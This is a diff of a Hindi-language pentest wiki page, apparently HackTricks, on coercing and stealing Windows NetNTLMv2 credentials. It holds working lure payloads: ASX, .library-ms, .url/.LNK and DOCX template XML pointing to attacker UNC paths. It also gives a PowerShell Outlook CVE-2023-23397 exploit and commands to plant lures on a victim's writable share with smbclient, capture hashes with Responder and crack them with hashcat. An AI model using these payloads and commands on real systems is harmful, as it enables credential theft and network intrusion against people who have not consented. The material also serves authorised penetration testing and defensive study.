@@ -1,13 +1,36 @@
-# Places to steal NTLM creds
+# NTLM creds चुराने के स्थान
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**इन सभी बेहतरीन विचारों को देखें: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — ऑनलाइन डाउनलोड किए गए microsoft word file से लेकर ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md और [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**
+**इन शानदार विचारों को देखें: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — ऑनलाइन Microsoft Word फ़ाइल के download से लेकर ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md और [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) में बताए गए विभिन्न तरीके।**
 
+### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)
+
+यदि आप **Explorer में उपयोगकर्ता या scheduled jobs द्वारा ब्राउज़ किए जाने वाले किसी share में लिख सकते हैं**, तो ऐसी फ़ाइलें छोड़ें जिनके metadata में आपका UNC दर्शाया हो (उदा. `\\ATTACKER\share`). फ़ोल्डर रेंडर करने पर **implicit SMB authentication** ट्रिगर होता है और यह आपके listener को **NetNTLMv2** leaks कर देता है।
+
+1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
+```bash
+git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
+uv add --script ntlm_theft.py xlsxwriter
+uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
+```
+2. **उन्हें लिखने योग्य शेयर पर डाल दें** (पीड़ित जिस भी फ़ोल्डर को खोलता है):
+```bash
+smbclient //victim/share -U 'guest%'
+cd transfer\
+prompt off
+mput lure/*
+```
+3. **Listen and crack**:
+```bash
+sudo responder -I <iface>          # capture NetNTLMv2
+hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
+```
+Windows एक साथ कई फ़ाइलों तक पहुँच सकता है; Explorer द्वारा पूर्वावलोकन (`BROWSE TO FOLDER`) किए जाने वाले किसी भी आइटम के लिए क्लिक की आवश्यकता नहीं होती।
 
 ### Windows Media Player प्लेलिस्ट (.ASX/.WAX)
 
-यदि आप अपने नियंत्रण में किसी target को Windows Media Player playlist खोलने या preview करने के लिए कह सकें, तो आप entry को एक UNC path की ओर इशारा कराकर Net‑NTLMv2 को leak कर सकते हैं। WMP संदर्भित मीडिया को SMB पर प्राप्त करने का प्रयास करेगा और implicitly authenticate कर देगा।
+यदि आप किसी लक्ष्य को आपके नियंत्रित Windows Media Player प्लेलिस्ट को खोलने या पूर्वावलोकन करने के लिए प्रेरित कर सकें, तो आप एंट्री को एक UNC path की ओर इंगित करके Net‑NTLMv2 leak कर सकते हैं। WMP संदर्भित मीडिया को SMB के माध्यम से प्राप्त करने का प्रयास करेगा और स्वतः प्रमाणीकृत करेगा।
 
 उदाहरण payload:
 ```xml
@@ -19,7 +42,7 @@
 </entry>
 </asx>
 ```
-संग्रह और cracking प्रवाह:
+Collection और cracking प्रवाह:
 ```bash
 # Capture the authentication
 sudo Responder -I <iface>
@@ -29,9 +52,9 @@ hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
 ```
 ### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)
 
-Windows Explorer जब ZIP आर्काइव के भीतर से सीधे .library-ms फाइलें खोली जाती हैं तो उन्हें असुरक्षित तरीके से हैंडल करता है। यदि library definition एक remote UNC path (उदा., \\attacker\share) की ओर इशारा करती है, तो ZIP के अंदर .library-ms को ब्राउज़/लॉन्च करने मात्र से Explorer उस UNC को एन्यूमेरेट करता है और हमलावर को NTLM authentication भेज देता है। इससे NetNTLMv2 प्राप्त होता है जिसे offline में क्रैक किया जा सकता है या संभावित रूप से relay किया जा सकता है।
+Windows Explorer .library-ms फ़ाइलों को असुरक्षित तरीके से हैंडल करता है जब वे सीधे ZIP आर्काइव के भीतर से खोली जाती हैं। अगर library definition किसी remote UNC path (e.g., \\attacker\share) की ओर इशारा करती है, तो ZIP के अंदर .library-ms को बस ब्राउज़/लॉन्च करने मात्र से Explorer उस UNC को enumerate करता है और हमलावर की ओर NTLM authentication भेज देता है। इससे NetNTLMv2 प्राप्त होता है जिसे ऑफ़लाइन क्रैक किया जा सकता है या संभावित रूप से relayed।
 
-न्यूनतम .library-ms जो हमलावर के UNC की ओर इशारा करती है
+Minimal .library-ms जो हमलावर के UNC की ओर इशारा करता है
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
@@ -52,14 +75,14 @@ Windows Explorer जब ZIP आर्काइव के भीतर से स
 </libraryDescription>
 ```
 Operational steps
-- ऊपर दिए गए XML के साथ .library-ms फाइल बनाएं (अपना IP/hostname सेट करें).
-- इसे ZIP करें (on Windows: Send to → Compressed (zipped) folder) और ZIP को target तक पहुँचाएं.
-- एक NTLM capture listener चलाएँ और victim के ZIP के अंदर से .library-ms खोलने का इंतजार करें.
+- उपरोक्त XML के साथ .library-ms फ़ाइल बनाएं (अपने IP/hostname सेट करें).
+- इसे ज़िप करें (Windows पर: Send to → Compressed (zipped) folder) और ZIP को लक्ष्य पर पहुँचाएँ.
+- एक NTLM capture listener चलाएँ और पीड़ित के ZIP के अंदर से .library-ms खोलने तक प्रतीक्षा करें.
 
 
 ### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak
 
-Microsoft Outlook for Windows calendar items में extended MAPI property PidLidReminderFileParameter को process करता था. अगर वह property किसी UNC path (e.g., \\attacker\share\alert.wav) की ओर इशारा करती थी, तो reminder के फायर होने पर Outlook SMB share से संपर्क करता और user का Net‑NTLMv2 बिना किसी क्लिक के leaking हो जाता था. इसे 14 मार्च 2023 को patch किया गया था, लेकिन यह legacy/untouched fleets और historical incident response के लिए अभी भी बहुत प्रासंगिक है.
+Microsoft Outlook for Windows ने calendar items में extended MAPI property PidLidReminderFileParameter को प्रोसेस किया। यदि वह property किसी UNC path की ओर इशारा करती थी (उदा., \\attacker\share\alert.wav), तो reminder फायर होने पर Outlook SMB share से संपर्क कर देता था, और बिना किसी क्लिक के उपयोगकर्ता का Net‑NTLMv2 leaking हो जाता था। इसे 14 March, 2023 को पैच किया गया था, लेकिन यह legacy/untouched fleets और ऐतिहासिक incident response के लिए अभी भी बहुत प्रासंगिक है।
 
 Quick exploitation with PowerShell (Outlook COM):
 ```powershell
@@ -72,15 +95,15 @@ Listener पक्ष:
 ```bash
 sudo responder -I eth0  # or impacket-smbserver to observe connections
 ```
-नोट्स
-- पीड़ित के पास केवल उस समय Outlook for Windows चल रहा होना चाहिए जब रिमाइंडर ट्रिगर हो।
-- यह leak Net‑NTLMv2 देता है, जो offline cracking या relay के लिए उपयुक्त है (pass‑the‑hash नहीं)।
+नोट
+- पीड़ित के पास केवल Outlook for Windows चल रहा होना चाहिए जब रिमाइंडर ट्रिगर हो।
+- यह leak Net‑NTLMv2 प्रदान करता है जो offline cracking या relay के लिए उपयुक्त है (pass‑the‑hash नहीं)।
 
-### .LNK/.URL आधारित zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)
+### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)
 
-Windows Explorer शॉर्टकट आइकॉन स्वचालित रूप से रेंडर करता है। हालिया रिसर्च ने दिखाया कि Microsoft के April 2025 के UNC‑icon shortcuts के patch के बाद भी, शॉर्टकट target को UNC path पर होस्ट करके और आइकॉन को लोकल रखकर बिना किसी क्लिक के NTLM authentication ट्रिगर करना संभव था (patch bypass को CVE‑2025‑50154 असाइन किया गया)। केवल फोल्डर देखने भर से Explorer रिमोट target से metadata प्राप्त कर लेता है और attacker SMB server को NTLM भेज देता है।
+Windows Explorer स्वतः शॉर्टकट आइकॉन रेंडर करता है। हालिया शोध से पता चला कि Microsoft के April 2025 के UNC‑icon shortcuts पैच के बाद भी, शॉर्टकट टार्गेट को UNC path पर होस्ट करके और आइकॉन को लोकल रखकर बिना किसी क्लिक के NTLM authentication ट्रिगर करना संभव था (patch bypass assigned CVE‑2025‑50154)। केवल फ़ोल्डर को देखना Explorer को रिमोट लक्ष्य से मेटाडेटा प्राप्त करने का कारण बनता है, जो NTLM को हमलावर के SMB सर्वर पर भेज देता है।
 
-Minimal Internet Shortcut payload (.url):
+न्यूनतम Internet Shortcut payload (.url):
 ```ini
 [InternetShortcut]
 URL=http://intranet
@@ -96,29 +119,28 @@ $sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
 $sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
 $sc.Save()
 ```
-डिलीवरी के विचार
-- shortcut को एक ZIP में डालें और लक्षित व्यक्ति को उसे ब्राउज़ करवाएँ।
-- shortcut को उस writable share पर रखें जिसे लक्षित खोलेंगे।
-- एक ही फ़ोल्डर में अन्य lure files के साथ मिलाएँ ताकि Explorer आइटम का पूर्वावलोकन करे।
-
+Delivery विचार
+- ZIP में shortcut डालें और पीड़ित को उसे ब्राउज़ करने के लिए प्रेरित करें।
+- shortcut को उस writable share पर रखें जिसे पीड़ित खोलेगा।
+- उसी फ़ोल्डर में अन्य lure files के साथ मिलाएँ ताकि Explorer आइटम का preview दिखाए।
 
 ### Office remote template injection (.docx/.dotm) to coerce NTLM
 
-Office documents बाहरी template को रेफर कर सकते हैं। यदि आप संलग्न template को UNC path पर सेट करते हैं, तो document खोलने पर SMB पर authenticate होगा।
+Office documents एक external template को reference कर सकते हैं। यदि आप attached template को किसी UNC path पर सेट करते हैं, तो document खोलने पर SMB के लिए authentication होगा।
 
-न्यूनतम DOCX relationship changes (inside word/):
+Minimal DOCX relationship बदलाव (inside word/):
 
-1) word/settings.xml संपादित करें और संलग्न template संदर्भ जोड़ें:
+1) word/settings.xml को संपादित करें और attached template reference जोड़ें:
 ```xml
 <w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
 ```
-2) word/_rels/settings.xml.rels को संपादित करें और rId1337 को अपने UNC की ओर इशारा करें:
+2) word/_rels/settings.xml.rels संपादित करें और rId1337 को अपने UNC की ओर इंगित करें:
 ```xml
 <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
 ```
-3) .docx में पुन:पैक करें और भेजें। अपना SMB capture listener चलाएँ और open होने का इंतज़ार करें।
+3) .docx में फिर पैक करें और डिलीवर करें। अपने SMB capture listener चलाएँ और open के लिए प्रतीक्षा करें।
 
-कैप्चर के बाद relaying या abusing NTLM के विचारों के लिए देखें:
+NTLM को relaying या abusing करने के post-capture ideas के लिए देखें:
 
 {{#ref}}
 README.md
@@ -126,6 +148,7 @@ README.md
 
 
 ## संदर्भ
+- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
 - [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
 - [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
 - [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
